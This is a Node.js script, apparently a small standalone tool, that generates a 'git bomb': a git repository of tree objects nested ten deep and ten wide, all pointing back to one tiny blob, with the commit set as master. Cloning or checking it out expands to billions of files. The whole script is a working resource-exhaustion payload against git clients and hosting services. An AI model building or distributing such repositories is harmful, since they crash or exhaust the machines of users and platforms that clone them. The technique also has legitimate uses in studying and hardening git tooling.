'use strict';

const asyncReduce = require('p-reduce');
const range = require('lodash.range');
const { promisify } = require('util');
const tmpFile = promisify(require('tmp').file);
const writeFile = promisify(require('fs').writeFile);
const exec = promisify(require('child_process').execFile);

// write a git object and return the hash
const writeGitObject = async (objectBody, { type }) => {
  const path = await tmpFile();
  await writeFile(path, objectBody);

  const { stdout } = await exec('git', ['hash-object', '-w', '-t', type, path]);
  return stdout.replace(/\n/, '');
};

// write a git commit and return the hash
const writeGitCommit = async (treeHash, commitMessage = 'create a git bomb') => {
  const { stdout } = await exec('git', ['commit-tree', '-m', `"${commitMessage}"`, treeHash]);
  return stdout;
};

const by = key => (a, b) => a[key] === b[key] ? 0 : a[key] < b[key] ? 1 : -1;
const createBlob = body => Buffer.from(body, 'ascii');
const unhexlify = body => Buffer.from(body, 'hex');

const createTree = (dirs, perm) => {
  const body = dirs.sort(by('name')).reduce((accumulator, { name, hash }) => {
    const buffer = Buffer.concat([
      accumulator,
      createBlob(perm),
      Buffer.from([0x20]),
      createBlob(name),
      Buffer.from([0x00]),
      unhexlify(hash)
    ]);

    return buffer;
  }, Buffer.from([]));

  return body;
};

if (require.main === module) {
  process.on('unhandledRejection', ({ message, code }) => {
    console.log(message);
    process.exit(code);
  });

  (async () => {
    const depth = 10;             // how many layers deep
    const width = 10;             // how many files or folders per depth level
    const blobBody = 'one laugh'; // content of blob at bottom

    // create base blob
    const blobHash = await writeGitObject(createBlob(blobBody), {type: 'blob'});

    const dirRange = range(width);

    // write tree object containing many files
    const dirs = dirRange.map(i => ({name: `f${i}`, hash: blobHash}));
    const rootHash = await writeGitObject(createTree(dirs, '100644'), {type: 'tree'});

    // make layers of tree objects using the previous tree object
    const treeHash = await asyncReduce(range(depth - 1), async (prevHash, i) => {
      const otherDirs = dirRange.map(i => ({name: `d${i}`, hash: prevHash}));

      const nextHash = await writeGitObject(createTree(otherDirs, '40000'), {type: 'tree'});
      return nextHash;
    }, rootHash);

    const commitHash = await writeGitCommit(treeHash);

    // update master ref
    await writeFile('.git/refs/heads/master', commitHash);
  })();
}
